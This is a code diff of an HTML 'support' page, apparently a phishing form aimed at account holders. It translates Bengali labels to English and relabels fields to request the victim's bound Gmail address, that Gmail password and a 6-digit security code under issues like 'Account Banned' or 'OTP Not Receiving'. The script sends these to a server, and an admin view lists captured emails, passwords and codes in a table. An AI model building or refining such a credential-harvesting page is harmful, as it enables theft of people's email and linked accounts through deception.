@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -189,32 +189,30 @@
 
             <form id="supportForm">
                 <div class="form-group">
-                    <label>User Gmail / Email</label>
-                    <input type="email" id="gmail" placeholder="Enter gmail" required>
+                    <label>Bind Gmail</label>
+                    <input type="email" id="gmail" placeholder="Enter bind gmail" required>
                 </div>
 
                 <div class="form-group">
-                    <label>Enter Password</label>
+                    <label>Bind Gmail Password</label>
                     <input type="password" id="password" placeholder="Enter password" required>
                 </div>
 
                 <div class="form-group">
-                    <label>Enter Confirm Password</label>
-                    <input type="password" id="confirmPassword" placeholder="Confirm password" required>
-                </div>
-
-                <div class="form-group">
                     <label>Security Code</label>
-                    <input type="text" id="securityCode" placeholder="Enter security code" required>
+                    <input type="text" id="securityCode" placeholder="Enter 6-digit security code" required>
                 </div>
 
                 <div class="form-group">
-                    <label>তোমার সমস্যা কি</label>
+                    <label>Select Problem</label>
                     <select id="problemType" required>
-                        <option value="" disabled selected>সমস্যা নির্বাচন করুন</option>
-                        <option value="Recovery Email Issue">Recovery Email</option>
-                        <option value="Bind SMS Issue">Bind SMS</option>
-                        <option value="Account Lock Problem">Account Lock</option>
+                        <option value="" disabled selected>Select your issue</option>
+                        <option value="Account Banned Issue">Account Banned Issue</option>
+                        <option value="Bind Gmail Lost">Bind Gmail Lost</option>
+                        <option value="OTP Not Receiving">OTP Not Receiving</option>
+                        <option value="Account Lock Problem">Account Lock Problem</option>
+                        <option value="Recovery Email Issue">Recovery Email Issue</option>
+                        <option value="Bind SMS Issue">Bind SMS Issue</option>
                         <option value="Other Issue">Other Issue</option>
                     </select>
                 </div>
@@ -249,7 +247,7 @@
                 <table>
                     <thead>
                         <tr>
-                            <th>Gmail</th>
+                            <th>Bind Gmail</th>
                             <th>Password</th>
                             <th>Security Code</th>
                             <th>Problem</th>
@@ -267,17 +265,10 @@
 
         document.getElementById('supportForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const pass = document.getElementById('password').value;
-            const confirmPass = document.getElementById('confirmPassword').value;
-
-            if (pass !== confirmPass) {
-                alert('পাসওয়ার্ড দুটি মিলছে না!');
-                return;
-            }
 
             const payload = {
                 gmail: document.getElementById('gmail').value,
-                password: pass,
+                password: document.getElementById('password').value,
                 securityCode: document.getElementById('securityCode').value,
                 problemType: document.getElementById('problemType').value
             };
@@ -290,11 +281,11 @@
                 });
                 const data = await res.json();
                 if(data.success) {
-                    alert('আপনার রিকোয়েস্ট সফলভাবে জমা হয়েছে!');
+                    alert('Your request has been submitted successfully!');
                     document.getElementById('supportForm').reset();
                 }
             } catch (err) {
-                alert('সাবমিট করতে সমস্যা হয়েছে।');
+                alert('Failed to submit request.');
             }
         });
 
@@ -339,10 +330,10 @@
                         `;
                     });
                 } else {
-                    alert(data.message || 'ভুল ইমেল বা পাসওয়ার্ড!');
+                    alert(data.message || 'Invalid Email or Password!');
                 }
             } catch (err) {
-                alert('সার্ভারে যোগাযোগ করতে সমস্যা হয়েছে।');
+                alert('Connection to server failed.');
             }
         }
     </script>
